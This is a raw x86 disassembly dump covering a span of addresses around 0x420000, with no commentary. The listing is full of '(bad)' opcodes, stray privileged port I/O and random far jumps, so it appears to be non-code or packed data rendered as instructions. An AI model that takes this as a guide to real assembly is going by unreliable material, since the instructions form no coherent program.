  4200c9:	inc    ebx
  4200ca:	mov    esi,0xe2b712e6
  4200cf:	xor    eax,0x4149c934
  4200d4:	sub    al,0xc1
  4200d6:	rol    bl,1
  4200d8:	sbb    ecx,DWORD PTR ds:0x438fd666
  4200de:	mov    eax,0xadd7912
  4200e3:	mov    ecx,DWORD PTR [ecx+0x709f1ffa]
  4200e9:	pop    edi
  4200ea:	test   DWORD PTR [esi-0x59c46e58],esp
  4200f0:	mov    WORD PTR [ebp+0x5c],es
  4200f3:	test   eax,0x87dd0eea
  4200f8:	cmp    esp,DWORD PTR [esi+0x42]
  4200fb:	cld    
  4200fc:	aaa    
  4200fd:	sub    esi,DWORD PTR [edi]
  4200ff:	repz aaa 
  420101:	ret    0xca8d
  420104:	xchg   edi,eax
  420105:	(bad)  
  420106:	sti    
  420107:	(bad)  
  420108:	es addr16 mov ebp,0x52e9fe6b
  42010f:	sti    
  420110:	or     esi,ecx
  420112:	inc    eax
  420113:	dec    esp
  420114:	mov    BYTE PTR [edi+ecx*2+0x35],dh
  420118:	stos   BYTE PTR es:[edi],al
  420119:	iret   
  42011a:	daa    
  42011b:	jle    0x42011d
  42011d:	(bad)  
  42011f:	xor    BYTE PTR [edi+0x5b7131cc],ah
  420125:	push   es
  420126:	adc    dl,al
  420128:	dec    ebp
  420129:	dec    ebx
  42012a:	xchg   edi,eax
  42012b:	sbb    ebx,edi
  42012d:	rcr    esi,0xc7
  420130:	push   ebp
  420131:	(bad)  
  420132:	scas   al,BYTE PTR es:[edi]
  420133:	in     al,0x93
	...
  420195:	add    BYTE PTR [ebx-0x31],dh
  420198:	fwait
  420199:	cmp    DWORD PTR [edi+0x5dcff37d],edi
  42019f:	xchg   ebp,eax
  4201a0:	xchg   ebx,eax
  4201a1:	dec    edi
  4201a2:	ja     0x42020b
  4201a4:	mov    dh,0x7a
  4201a6:	jnp    0x4201fc
  4201a8:	add    DWORD PTR [eax],eax
  4201aa:	pop    es
  4201ab:	add    DWORD PTR [eax],eax
  4201ad:	add    bl,bl
  4201af:	outs   dx,BYTE PTR ds:[esi]
  4201b0:	rcr    DWORD PTR [ebp-0x53a9101],0x61
  4201b7:	in     eax,dx
  4201b8:	mov    dh,0x45
  4201ba:	ficom  WORD PTR [eax+0x36]
  4201bd:	fwait
  4201be:	or     BYTE PTR [ecx+0x5981dfba],ch
  4201c4:	pop    ebx
  4201c5:	mov    esp,0x29ab2488
  4201ca:	cld    
  4201cb:	jae    0x4201ba
  4201cd:	pop    edx
  4201ce:	jecxz  0x420195
  4201d0:	jecxz  0x420227
  4201d2:	pop    ebp
  4201d3:	std    
  4201d4:	add    esp,DWORD PTR [esi+0x3b]
  4201d7:	fcmove st,st(2)
  4201d9:	mov    edx,esi
  4201db:	cmp    eax,0x87e9121c
  4201e0:	test   al,0xd3
  4201e2:	enter  0x342e,0x44
  4201e6:	sub    eax,0x38cef4cb
  4201eb:	and    al,0x37
  4201ed:	inc    esp
  4201ee:	cmp    eax,0xca7e2173
  4201f3:	jg     0x4201dc
  4201f5:	mov    DWORD PTR [esi-0x68e28503],esp
  4201fb:	pop    eax
  4201fc:	scas   eax,DWORD PTR es:[edi]
  4201fd:	mov    dl,0xec
  4201ff:	fwait
  420200:	sub    al,0x32
  420202:	xchg   esp,eax
  420203:	mov    ch,0x43
  420205:	xchg   BYTE PTR [edx+eiz*8-0x5f],dh
  420209:	pinsrw mm3,WORD PTR [ebx-0x2d],0xb
  42020e:	gs scas eax,DWORD PTR es:[edi]
  420210:	mov    BYTE PTR [ebp-0x53d11bc2],al
  420216:	and    DWORD PTR [ecx],ecx
  420218:	mov    bh,0x6d
  42021a:	lea    edi,[ebx]
  42021c:	xchg   ecx,eax
  42021d:	hlt    
  42021e:	bound  eax,QWORD PTR [edi-0x3070b533]
  420224:	push   ss
  420225:	push   0x9ca5629e
  42022a:	(bad)  
  42022c:	arpl   WORD PTR [edi-0x20ca3a02],bp
  420232:	int3   
  420233:	push   0x4f
  420235:	xchg   ebx,eax
  420236:	or     al,0x8
  420238:	leave  
  420239:	lahf   
  42023a:	add    esi,DWORD PTR [edx+0x3644c683]
  420240:	adc    DWORD PTR [edi+0x56],esp
  420243:	fiadd  DWORD PTR [edx-0x1aa2b85]
  420249:	jb     0x420295
  42024b:	jno    0x42021b
  42024d:	mov    dh,0x84
  42024f:	ss mov ecx,0xf5722b0e
  420255:	inc    edi
  420256:	jo     0x420203
  420258:	pop    ds
  420259:	inc    edx
  42025a:	push   eax
  42025b:	cmp    BYTE PTR [ecx-0x4e88ca0d],al
  420261:	jl     0x420284
  420263:	iret   
  420264:	sub    eax,0xc1663c1a
  420269:	scas   eax,DWORD PTR es:[edi]
  42026a:	imul   esi,DWORD PTR [eax-0x26aabbb],0x1a
  420271:	out    0xcd,al
  420273:	out    0xaf,eax
  420275:	pop    es
  420276:	cwde   
  420277:	push   ebp
  420278:	push   0x600221c3
  42027d:	aas    
  42027e:	mov    dl,0x54
  420280:	mov    al,ds:0x9dd44c69
  420285:	xlat   BYTE PTR ds:[ebx]
  420286:	(bad)  
  420287:	ficomp DWORD PTR [edx+0x5940b9ed]
  42028d:	sbb    al,0xd9
  42028f:	stc    
  420290:	loop   0x42026d
  420292:	or     BYTE PTR [esi+0x33],al
  420295:	enter  0xfc6e,0x2f
  420299:	call   0x6a03:0x72b17533
  4202a0:	ds xchg dl,ch
  4202a3:	push   cs
  4202a4:	sbb    bh,bh
  4202a6:	push   esp
  4202a7:	out    0xa7,al
  4202a9:	idiv   BYTE PTR ds:0xe6174765
  4202af:	call   DWORD PTR [ebp+0x7fada9fc]
	...
  420315:	add    BYTE PTR [ecx+0x6],al
  420318:	clc    
  420319:	mov    esi,0xff47feff
  42031e:	mov    cl,0x27
  420320:	pop    ebx
  420321:	fild   WORD PTR [ecx-0x7df72d16]
  420327:	push   ebp
  420328:	add    DWORD PTR [eax],eax
  42032a:	pop    es
  42032b:	add    DWORD PTR [eax],eax
  42032d:	add    dl,cl
  42032f:	push   edx
  420330:	mov    dl,BYTE PTR [edi-0x32abe4ae]
  420336:	rcr    ebp,cl
  420338:	adc    edx,DWORD PTR [ecx+0x49a270d0]
  42033e:	sub    ecx,esp
  420340:	inc    edx
  420341:	leave  
  420342:	jecxz  0x4202f7
  420344:	sahf   
  420345:	mov    bh,0x64
  420347:	loopne 0x420315
  420349:	in     eax,dx
  42034a:	mov    ah,0x63
  42034c:	lahf   
  42034d:	cmp    eax,0x5c1a348d
  420352:	(bad)  
  420353:	gs loopne 0x4203cc
  420356:	fcomp  QWORD PTR [ecx-0x7d0a61d9]
  42035c:	js     0x4203ac
  42035e:	pop    esi
  42035f:	into   
  420360:	and    al,0xe5
  420362:	xor    ebx,DWORD PTR [edx-0x5e]
  420365:	gs push ds
  420367:	not    DWORD PTR [ebx-0xfc46f7]
  42036d:	sub    ch,bl
  42036f:	push   es
  420370:	adc    eax,DWORD PTR [ebx+0x19]
  420373:	je     0x4203cf
  420375:	into   
  420376:	sar    al,cl
  420378:	adc    dl,BYTE PTR ds:0x703bc042
  42037e:	nop
  42037f:	test   BYTE PTR [eax],ch
  420381:	jmp    0x420357
  420383:	scas   eax,DWORD PTR es:[edi]
  420384:	bound  eax,QWORD PTR [ebx]
  420386:	leave  
  420387:	out    0xdc,al
  420389:	(bad)  
  42038b:	ret    0xe0e5
  42038e:	ins    DWORD PTR es:[edi],dx
  42038f:	jnp    0x420373
  420391:	add    al,0x4b
  420393:	inc    edi
  420394:	arpl   WORD PTR [ebx+esi*4-0x47f89215],sp
  42039b:	jno    0x42037f
  42039d:	aad    0x14
  42039f:	push   edi
  4203a0:	xchg   ecx,eax
  4203a1:	lahf   
  4203a2:	cmp    BYTE PTR [edx+0x123bdf9d],ch
  4203a8:	xchg   esp,eax
  4203a9:	add    esi,ebx
  4203ab:	jg     0x4203c7
  4203ad:	xchg   edx,eax
  4203ae:	hlt    
  4203af:	inc    esp
  4203b0:	cli    
  4203b1:	jl     0x4203ec
  4203b3:	arpl   WORD PTR [edx-0x7a3844b],si
  4203b9:	lock ror DWORD PTR [ecx],cl
  4203bc:	inc    ebp
  4203bd:	outs   dx,BYTE PTR ds:[esi]
  4203be:	add    al,0x5d
  4203c0:	fcom   DWORD PTR [esi-0x696aac1c]
  4203c6:	in     al,0x85
  4203c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203c9:	and    eax,0x5f3c828d
  4203ce:	out    0x22,al
  4203d0:	cs cs jmp 0x42035c
  4203d4:	enter  0x9fb2,0xdb
  4203d8:	xor    al,0xd4
  4203da:	fist   DWORD PTR [ecx-0x3]
  4203dd:	fst    DWORD PTR [eax+0x47]
  4203e0:	sub    esp,eax
  4203e2:	push   0x388dbdd9
  4203e7:	sbb    al,0xe8
  4203e9:	sub    DWORD PTR [esi-0x7f89b984],eax
  4203ef:	aas    
  4203f0:	push   ebp
  4203f1:	ins    DWORD PTR es:[edi],dx
  4203f2:	out    dx,al
  4203f3:	push   0x4985be7f
  4203f8:	ror    dl,0x8e
  4203fb:	pop    ss
  4203fc:	add    eax,0xf5375d3d
  420401:	out    0xd7,al
  420403:	in     eax,0xb1
  420405:	jl     0x4203e0
  420407:	lods   al,BYTE PTR ds:[esi]
  420408:	pop    ss
  420409:	or     ch,BYTE PTR [esi-0x54]
  42040c:	ret    
  42040d:	mov    dl,0x28
  42040f:	rcl    esi,0x23
  420412:	mov    esi,0x94371430
  420417:	sti    
  420418:	xchg   ecx,eax
  420419:	inc    edx
  42041a:	daa    
  42041b:	push   cs
  42041c:	out    0x37,al
  42041e:	pop    edi
  42041f:	xor    eax,DWORD PTR [eax-0x42fc573]
  420425:	mov    dh,0x2e
  420427:	sub    dl,BYTE PTR [ebx-0x4aef86c2]
  42042d:	push   ds
  42042e:	xchg   esi,eax
  42042f:	cld    
  420430:	xchg   esp,eax
  420431:	jp     0x4203d3
  420433:	fcomip st,st(4)
	...
  420495:	add    BYTE PTR [esi+0x7f125794],ch
  42049b:	shr    edi,cl
  42049d:	mov    esp,0xb41496f0
  4204a2:	jge    0x420468
  4204a4:	cmp    eax,0x1568930
  4204a9:	add    BYTE PTR [edi],al
  4204ab:	add    DWORD PTR [eax],eax
  4204ad:	add    BYTE PTR [edx],dl
  4204af:	cli    
  4204b0:	cld    
  4204b1:	test   eax,0xbcd9ab96
  4204b6:	out    dx,al
  4204b7:	inc    edx
  4204b8:	loop   0x420503
  4204ba:	mov    ds:0x42051ee8,eax
  4204bf:	inc    ebx
  4204c0:	add    DWORD PTR [ebp+0x5420f9d],esi
  4204c6:	sub    BYTE PTR [ebp+0x67],ah
  4204c9:	test   ch,0x71
  4204cc:	pop    ebp
  4204ce:	aaa    
  4204cf:	lods   eax,DWORD PTR ds:[esi]
  4204d0:	loop   0x420522
  4204d2:	jg     0x4204cf
  4204d4:	cwde   
  4204d5:	inc    ecx
  4204d6:	mov    ebx,0x4c0801f2
  4204db:	or     cl,BYTE PTR [eax-0x25bfbfd9]
  4204e1:	xchg   ecx,eax
  4204e2:	inc    edi
  4204e3:	xor    DWORD PTR [edi+0x4d7871e1],esp
  4204e9:	jge    0x420545
  4204eb:	lea    esp,[esi+0x1c]
  4204ee:	call   0x5dc6:0x5e3d6060
  4204f5:	mov    BYTE PTR [edi-0x10],cl
  4204f8:	ret    0x13ad
  4204fb:	loop   0x420515
  4204fd:	test   DWORD PTR [ebp+0x501f3315],ebp
  420503:	push   cs
  420504:	loopne 0x4204c7
  420506:	rol    BYTE PTR [ecx+0x2607f382],0xa5
  42050d:	push   ecx
  42050e:	sub    BYTE PTR [edi-0x4f34d29],dh
  420514:	cmp    al,0xb6
  420516:	pop    edi
  420517:	pop    ss
  420518:	fnstenv [esi+0x21eef35e]
  42051e:	mov    al,ds:0x3a2c8b8c
  420523:	pop    edi
  420524:	scas   eax,DWORD PTR es:[edi]
  420525:	mov    WORD PTR [edi],?
  420527:	push   edi
  420528:	loopne 0x4204d3
  42052a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42052b:	and    DWORD PTR [ebx+0x7],0x488c3d1d
  420532:	mov    ah,0x2f
  420534:	dec    esi
  420535:	in     eax,0x3e
  420537:	je     0x420529
  420539:	xor    ch,BYTE PTR [ecx+ecx*8]
  42053c:	xor    DWORD PTR [edx+ebx*4],esp
  42053f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420540:	and    BYTE PTR [edx-0x59ba8e51],0xfe
  420547:	xor    eax,0x98bb3b1a
  42054c:	ins    BYTE PTR es:[edi],dx
  42054d:	loope  0x42051f
  42054f:	mov    esi,0x149296b1
  420554:	pop    ss
  420555:	xchg   ecx,eax
  420556:	sbb    ch,cl
  420558:	gs int3 
  42055a:	lahf   
  42055b:	sub    edi,edi
  42055d:	cmp    DWORD PTR [eax-0x16],esp
  420560:	icebp  
  420561:	imul   eax,DWORD PTR [ecx],0xffffffb2
  420564:	mov    dl,0xe6
  420566:	jle    0x420598
  420568:	mov    al,0x1a
  42056a:	jp     0x42055e
  42056c:	adc    BYTE PTR [ebx-0x441b55dc],ah
  420572:	dec    ebx
  420573:	loope  0x4204fe
  420575:	loopne 0x42051d
  420577:	pop    ebp
  420578:	lock sahf 
  42057a:	push   edx
  42057b:	cmc    
  42057c:	mov    ah,0x4f
  42057e:	add    dh,al
  420580:	adc    eax,0xb6b6132c
  420585:	push   edx
  420586:	aas    
  420587:	repz js 0x4205f7
  42058a:	idiv   bl
  42058c:	mov    edx,0x3a001a70
  420591:	nop
  420592:	mov    BYTE PTR [ebp+0x42],dh
  420595:	mov    bh,0xf6
  420597:	push   edi
  420598:	push   ebx
  420599:	call   0xb2e5:0xc3e4c473
  4205a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205a1:	jb     0x420575
  4205a3:	mov    fs,WORD PTR [edx-0x67578d36]
  4205a9:	jmp    0xf849f78a
  4205ae:	ret    
  4205af:	into   
  4205b0:	mov    eax,ds:0x118aa10
	...
  420615:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  42061c:	mov    ah,0xec
  42061e:	btc    DWORD PTR [edx],edx
  420621:	mov    ebx,0x4f01e996
  420626:	nop
  420627:	push   edi
  420628:	add    DWORD PTR [eax],eax
  42062a:	pop    es
  42062b:	add    DWORD PTR [eax],eax
  42062d:	add    dh,dh
  42062f:	js     0x420630
  420631:	aas    
  420632:	(bad)  [ecx+ecx*4+0x17]
  420636:	dec    ebp
  420637:	inc    ebx
  420638:	retf   
  420639:	repz push es
  42063b:	imul   esi,DWORD PTR [eax-0x64],0x4d593c4c
  420642:	out    dx,al
  420643:	push   edi
  420644:	inc    edi
  420645:	add    DWORD PTR [ebx+0x56b09be],ebx
  42064b:	sub    edi,DWORD PTR [eax-0x28]
  42064e:	int    0xe5
  420650:	mov    bh,0x81
  420652:	sub    al,0xc4
  420654:	sbb    cl,BYTE PTR [ebp-0x31]
  420657:	cld    
  420658:	push   esp
  420659:	mov    edx,cs
  42065b:	inc    ecx
  42065c:	xor    al,0x51
  42065e:	or     al,0xd4
  420660:	outs   dx,BYTE PTR ds:[esi]
  420661:	dec    edx
  420662:	cmp    al,0xdc
  420664:	push   esp
  420665:	and    bh,BYTE PTR [eax+0x4106258c]
  42066b:	test   DWORD PTR [esi],edx
  42066d:	popf   
  42066e:	hlt    
  42066f:	data16 mov ds:0x60069ec0,al
  420675:	jg     0x4206af
  420677:	sbb    BYTE PTR [eax-0x25],bl
  42067a:	fbstp  TBYTE PTR [edi+0x50]
  42067d:	dec    ecx
  42067e:	aaa    
  42067f:	pusha  
  420680:	out    dx,al
  420681:	and    al,0xde
  420683:	dec    edx
  420684:	stc    
  420685:	inc    edi
  420686:	push   es
  420687:	xchg   edx,eax
  420688:	inc    edi
  420689:	xchg   edx,eax
  42068a:	stc    
  42068b:	(bad)  
  42068c:	cmp    esi,DWORD PTR [edx+0x47]
  42068f:	les    esi,FWORD PTR [esp+esi*1]
  420692:	adc    al,0x93
  420694:	sub    ah,BYTE PTR [ebp+ebx*4+0x2ea46f5c]
  42069b:	in     al,0xff
  42069d:	mov    ecx,0xf70a2440
  4206a2:	mov    edx,0xf4ccda2a
  4206a7:	adc    DWORD PTR [edi+0x35],ebx
  4206aa:	mov    dl,0x4
  4206ac:	stos   BYTE PTR es:[edi],al
  4206ad:	icebp  
  4206ae:	sar    BYTE PTR ds:0x8e8fbbf3,cl
  4206b4:	cmp    al,0xae
  4206b6:	and    dl,BYTE PTR [eax-0x37c462]
  4206bc:	mov    ebp,0x4165efcd
  4206c1:	jae    0x4206ed
  4206c3:	enter  0xcd82,0x9e
  4206c7:	popa   
  4206c8:	mov    eax,0x7df9838e
  4206cd:	push   ss
  4206ce:	ja     0x4206af
  4206d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206d1:	adc    eax,DWORD PTR [ebx+edi*1+0x3]
  4206d5:	push   ds
  4206d6:	into   
  4206d7:	sub    BYTE PTR [edx+0x1ebcf37b],bl
  4206dd:	dec    ecx
  4206de:	and    ecx,DWORD PTR [esi]
  4206e0:	or     al,0xbf
  4206e2:	retf   
  4206e3:	je     0x4206f2
  4206e5:	inc    esi
  4206e6:	pop    ds
  4206e7:	les    esi,FWORD PTR [edx]
  4206e9:	xor    DWORD PTR [ebp+ebx*1+0x73],eax
  4206ed:	ret    0x1380
  4206f0:	adc    eax,0xd3329558
  4206f5:	lahf   
  4206f6:	stos   BYTE PTR es:[edi],al
  4206f7:	add    eax,0xddaaec1a
  4206fc:	pop    esp
  4206fd:	add    ch,BYTE PTR [ebx-0x1c]
  420700:	or     DWORD PTR [edi],ecx
  420702:	pushf  
  420703:	(bad)  
  420704:	imul   edi,DWORD PTR [esi],0xffffffd5
  420707:	jmp    0xa5685695
  42070c:	adc    eax,0xf9014381
  420711:	loop   0x4206a6
  420713:	push   es
  420714:	mov    dh,0x46
  420716:	jnp    0x420781
  420718:	cld    
  420719:	je     0x4206d6
  42071b:	sub    edx,DWORD PTR [edx+0x3e2a2ade]
  420721:	scas   eax,DWORD PTR es:[edi]
  420722:	inc    edx
  420723:	(bad)  
  420724:	out    0xd4,al
  420726:	xor    BYTE PTR [esi-0xe],cl
  420729:	mov    dh,0xda
  42072b:	sbb    al,0xf9
  42072d:	jb     0x420739
  42072f:	dec    esp
  420730:	dec    ebx
  420731:	sahf   
  420732:	int3   
  420733:	fbld   TBYTE PTR [edi+0x0]
	...
  420795:	add    BYTE PTR [ecx-0x587fdad1],cl
  42079b:	mov    ch,BYTE PTR [ebp-0x642816d1]
  4207a1:	sub    ebp,DWORD PTR [edx+0x3f]
  4207a4:	pop    eax
  4207a5:	call   0x107:0x15897
  4207ac:	add    BYTE PTR [eax],al
  4207ae:	aam    0x8d
  4207b0:	sub    DWORD PTR ds:0xbe84afba,esp
  4207b6:	fnsetpm(287 only) 
  4207b8:	inc    eax
  4207b9:	nop
  4207ba:	jne    0x420787
  4207bc:	and    BYTE PTR [ebp+eiz*8-0x58],al
  4207c0:	xchg   esi,eax
  4207c1:	aad    0xf9
  4207c3:	ror    DWORD PTR [edx-0x258b59e2],cl
  4207c9:	out    dx,al
  4207ca:	ins    DWORD PTR es:[edi],dx
  4207cb:	stos   BYTE PTR es:[edi],al
  4207cc:	jae    0x420814
  4207ce:	cmp    DWORD PTR [ebx+0x18],0x35855c96
  4207d5:	lgs    edx,FWORD PTR ds:0x31e7560c
  4207dc:	les    ebp,FWORD PTR [eax+0x2c]
  4207df:	jbe    0x4207aa
  4207e1:	pop    esi
  4207e2:	hlt    
  4207e3:	push   eax
  4207e4:	into   
  4207e5:	and    al,0xa
  4207e7:	xor    esp,esp
  4207e9:	or     al,0x93
  4207eb:	pusha  
  4207ec:	sub    ebx,DWORD PTR [ebx-0x60]
  4207ef:	dec    edi
  4207f0:	fcomp  DWORD PTR [ecx+0x73dbc92c]
  4207f6:	cmp    eax,0x32
  4207f9:	mov    ah,0xa
  4207fb:	adc    al,0x65
  4207fd:	fstp   TBYTE PTR [edx+eax*4+0xf046227]
  420804:	ss jp  0x420874
  420807:	gs es xor eax,0x7cd0f63
  42080e:	out    dx,al
  42080f:	cdq    
  420810:	mov    WORD PTR [edi+0x35450d81],fs
  420816:	not    DWORD PTR [ecx-0x3ba67e98]
  42081c:	jmp    0xf60cbe50
  420821:	jg     0x42089f
  420823:	(bad)  
  420824:	or     DWORD PTR [bx+si+0x45],esp
  420828:	xor    eax,0xb6c9e60f
  42082d:	ins    BYTE PTR es:[edi],dx
  42082e:	in     al,0xff
  420830:	cmp    ebp,DWORD PTR [edx+0x6d452026]
  420836:	push   ds
  420837:	and    al,BYTE PTR [ebp-0x6741a8a5]
  42083d:	stc    
  42083e:	out    0xc1,eax
  420840:	pop    edx
  420841:	daa    
  420842:	sub    dh,BYTE PTR [ecx]
  420844:	cmp    ecx,DWORD PTR [edi]
  420846:	imul   ebp,DWORD PTR [ebp+0x25],0xc03860e4
  42084d:	sub    DWORD PTR [ebx+0x10],0xa4baa301
  420854:	sub    esp,ecx
  420856:	and    ch,BYTE PTR [esi-0x4bc77955]
  42085c:	push   eax
  42085d:	test   eax,0x82145839
  420862:	hlt    
  420863:	inc    edi
  420864:	and    al,0x3a
  420866:	fwait
  420867:	clc    
  420868:	or     eax,0x81200f9b
  42086d:	xchg   esp,eax
  42086e:	test   DWORD PTR [ebx-0x50],ecx
  420871:	icebp  
  420872:	test   edi,ebp
  420874:	pop    ds
  420875:	jbe    0x420840
  420877:	es pop ss
  420879:	mov    edx,0xcee0766d
  42087e:	jno    0x420827
  420880:	mov    edx,0x504133e1
  420885:	xchg   esp,eax
  420886:	gs xor eax,0x31c16416
  42088c:	push   edi
  42088d:	pop    ebx
  42088e:	jbe    0x420870
  420890:	dec    ebx
  420891:	(bad)  
  420892:	call   0x4440cba4
  420897:	pop    ebp
  420898:	mov    ah,0x7c
  42089a:	jge    0x4208b5
  42089c:	lods   eax,DWORD PTR ds:[esi]
  42089d:	mov    ch,0x8f
  42089f:	(bad)  [edx-0x75]
  4208a2:	jp     0x42091a
  4208a4:	cmp    ah,BYTE PTR [esi+0x74601da3]
  4208aa:	aam    0x35
  4208ac:	sbb    DWORD PTR [eax+0x1b73d9ae],esp
  4208b2:	stos   BYTE PTR es:[edi],al
  4208b3:	loope  0x42086e
	...
  420915:	add    ah,bl
  420917:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420918:	jae    0x420967
  42091a:	jnp    0x4208fb
  42091c:	(bad)  
  42091d:	mov    ch,0x79
  42091f:	jne    0x42092f
  420921:	ret    0x7fa9
  420924:	scas   al,BYTE PTR es:[edi]
  420925:	xor    eax,0x1599e
  42092a:	pop    es
  42092b:	add    DWORD PTR [eax],eax
  42092d:	add    BYTE PTR [edi+esi*8],al
  420930:	je     0x4208fb
  420932:	jae    0x42095a
  420934:	loop   0x420988
  420936:	jle    0x4208e6
  420938:	imul   ebp,DWORD PTR [ecx+0x79],0x76
  42093c:	adc    ah,ch
  42093e:	xor    ebp,edi
  420940:	and    cl,BYTE PTR [eax-0x3a]
  420943:	cmp    BYTE PTR [ebx+0x6a],0x31
  420947:	sbb    esi,DWORD PTR [edx-0x27]
  42094a:	sbb    al,0x89
  42094c:	lods   eax,DWORD PTR ds:[esi]
  42094d:	scas   al,BYTE PTR es:[edi]
  42094e:	dec    ebp
  42094f:	xchg   edi,eax
  420950:	dec    esi
  420951:	jge    0x4208f1
  420953:	into   
  420954:	or     al,0x68
  420956:	mov    bh,0x44
  420958:	xlat   BYTE PTR ds:[ebx]
  420959:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42095a:	shr    edx,0x59
  42095d:	sbb    al,0xfe
  42095f:	idiv   BYTE PTR [ecx]
  420961:	sub    edi,DWORD PTR [edi]
  420963:	loop   0x4209e3
  420965:	jp     0x420934
  420967:	and    bl,BYTE PTR [edx+0x7435c03f]
  42096d:	mov    eax,0xb428ae09
  420972:	pop    edi
  420973:	jp     0x4209c9
  420975:	int3   
  420976:	inc    ebp
  420977:	std    
  420978:	fs inc edi
  42097a:	jge    0x420915
  42097c:	mov    esi,0x9f6e5540
  420981:	sub    al,0x9a
  420983:	add    al,bh
  420985:	(bad)  
  420986:	jnp    0x4209fd
  420988:	ins    BYTE PTR es:[edi],dx
  420989:	push   es
  42098a:	xor    ch,ch
  42098c:	fimul  WORD PTR [edx]
  42098e:	test   ebp,ecx
  420990:	rcl    DWORD PTR [eax],cl
  420992:	push   ss
  420993:	into   
  420994:	mul    DWORD PTR [edi-0x30]
  420997:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420998:	jp     0x420998
  42099a:	loope  0x4209e5
  42099c:	cs dec eax
  42099e:	das    
  42099f:	jo     0x42093b
  4209a1:	jmp    0x420a0a
  4209a3:	push   eax
  4209a4:	xchg   esp,eax
  4209a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209a6:	mov    DWORD PTR [esi],esp
  4209a8:	inc    ebp
  4209a9:	xchg   DWORD PTR [esi],eax
  4209ab:	mov    ah,0xc3
  4209ad:	dec    esi
  4209ae:	jecxz  0x42096f
  4209b0:	mov    cl,0x18
  4209b2:	pop    ebp
  4209b3:	call   0xdb94f70c
  4209b8:	mov    dh,0x61
  4209ba:	lds    eax,FWORD PTR [eax]
  4209bc:	dec    ecx
  4209bd:	jg     0x420977
  4209bf:	jmp    0xbc85:0xd32c6cca
  4209c6:	mov    bh,BYTE PTR [esi]
  4209c8:	pop    ds
  4209c9:	test   BYTE PTR [ebx+0x5085d5e2],ch
  4209cf:	jg     0x420a1e
  4209d1:	sbb    BYTE PTR [edx+0x51],dl
  4209d4:	add    DWORD PTR [esi-0x676e078f],ecx
  4209da:	push   ecx
  4209db:	or     DWORD PTR [ebx-0x4a],0x76
  4209df:	icebp  
  4209e0:	jmp    0x9b80:0x6c7e6324
  4209e7:	ds loop 0x420a3d
  4209ea:	imul   ebp,eax,0x386d568f
  4209f0:	push   cs
  4209f1:	fdivr  st(0),st
  4209f3:	sar    BYTE PTR [ecx],1
  4209f5:	push   cs
  4209f6:	loope  0x4209f6
  4209f8:	test   DWORD PTR [ebp+0x7187bfd2],ecx
  4209fe:	js     0x420a4d
  420a00:	pop    es
  420a01:	cdq    
  420a02:	sub    al,dh
  420a04:	popa   
  420a05:	ds push edi
  420a07:	aas    
  420a08:	aam    0xa
  420a0a:	call   0x3f0d:0x738e4cf8
  420a11:	pusha  
  420a12:	mov    ch,0xdd
  420a14:	ret    
  420a15:	loope  0x420a21
  420a17:	cmp    eax,0x65a2227d
  420a1c:	mov    ds,WORD PTR [eax-0x4b]
  420a1f:	xor    al,cl
  420a21:	and    eax,0x179a4f0a
  420a26:	add    edi,DWORD PTR [edi-0x17]
  420a29:	push   edx
  420a2a:	push   edx
  420a2b:	xchg   ecx,eax
  420a2c:	dec    esi
  420a2d:	add    BYTE PTR [ecx+0x43],cl
  420a30:	and    al,ch
  420a32:	fidiv  WORD PTR [ebp-0x18]
	...
  420a95:	add    bh,bl
  420a97:	xor    ch,BYTE PTR [edi-0x6010ed]
  420a9d:	(bad)  
  420a9e:	(bad)  
  420aa0:	std    
  420aa1:	test   BYTE PTR [ebp-0x70],ch
  420aa4:	xchg   ebp,eax
  420aa5:	mov    fs,WORD PTR [ebp+0x700015a]
  420aab:	add    DWORD PTR [eax],eax
  420aad:	add    BYTE PTR [edx-0x41],ah
  420ab0:	add    DWORD PTR [edx+0x57],ebp
  420ab3:	pop    ecx
  420ab4:	or     ebp,DWORD PTR [ebx-0x20]
  420ab7:	mov    ebx,0xfa122220
  420abc:	add    bh,ch
  420abe:	cld    
  420abf:	mov    WORD PTR [edx],gs
  420ac1:	(bad)  
  420ac2:	jg     0x420aac
  420ac4:	ret    0x5f91
  420ac7:	ss cpuid 
  420aca:	pop    esp
  420acb:	jmp    0xc8de:0x22cb1970
  420ad2:	and    DWORD PTR [ecx],esp
  420ad4:	shl    ch,cl
  420ad6:	xlat   BYTE PTR ds:[ebx]
  420ad7:	ins    DWORD PTR es:[edi],dx
  420ad8:	xchg   DWORD PTR [esp+eiz*8-0x6f],ebx
  420adc:	mov    al,0x89
  420ade:	or     eax,0x35314e0f
  420ae3:	ja     0x420ab3
  420ae5:	(bad)  
  420ae6:	push   0x13048413
  420aeb:	js     0x420b6b
  420aed:	push   ebp
  420aee:	fucomi st,st(1)
  420af0:	push   ecx
  420af1:	cmova  edi,DWORD PTR [eax+0x3c]
  420af5:	ins    DWORD PTR es:[edi],dx
  420af6:	ret    
  420af7:	pop    ds
  420af8:	sti    
  420af9:	or     al,0x8e
  420afb:	or     BYTE PTR [edi+edx*8+0x253e5864],bl
  420b02:	push   ecx
  420b03:	jl     0x420b24
  420b05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b06:	mov    esi,0x7afb0b21
  420b0b:	lock or BYTE PTR [edx],0xd8
  420b0f:	dec    edx
  420b10:	lods   al,BYTE PTR ds:[esi]
  420b11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b12:	in     al,dx
  420b13:	mov    ds:0x3d752c64,eax
  420b18:	mov    BYTE PTR [ebp+0x1f],0xfe
  420b1c:	lods   eax,DWORD PTR ds:[esi]
  420b1d:	stc    
  420b1e:	int3   
  420b1f:	mov    eax,ds:0x1e6cae66
  420b24:	jge    0x420b60
  420b26:	ins    DWORD PTR es:[edi],dx
  420b27:	sahf   
  420b28:	into   
  420b29:	ret    
  420b2a:	xchg   esp,eax
  420b2b:	stc    
  420b2c:	or     eax,0xa74d3107
  420b31:	data16 sbb al,0x8c
  420b34:	rcr    BYTE PTR [ecx-0xb95c479],1
  420b3a:	adc    al,BYTE PTR [eax-0x2e58fbcb]
  420b40:	loope  0x420aee
